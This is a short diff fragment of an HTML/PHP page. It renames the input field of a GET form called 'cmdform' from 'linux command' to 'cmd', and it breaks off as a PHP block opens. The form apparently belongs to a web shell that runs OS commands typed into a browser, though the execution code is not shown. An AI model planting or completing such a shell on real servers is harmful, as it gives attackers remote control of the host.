@@ -4,7 +4,7 @@
 <HTML>
 <BODY>
 <FORM METHOD=”GET” NAME=”cmdform” ACTION=””>
-<INPUT TYPE=”text” NAME=”linux command”>
+<INPUT TYPE=”text” NAME=”cmd”>
 <INPUT TYPE=”submit” VALUE=”command”>
 </FORM>
 <?
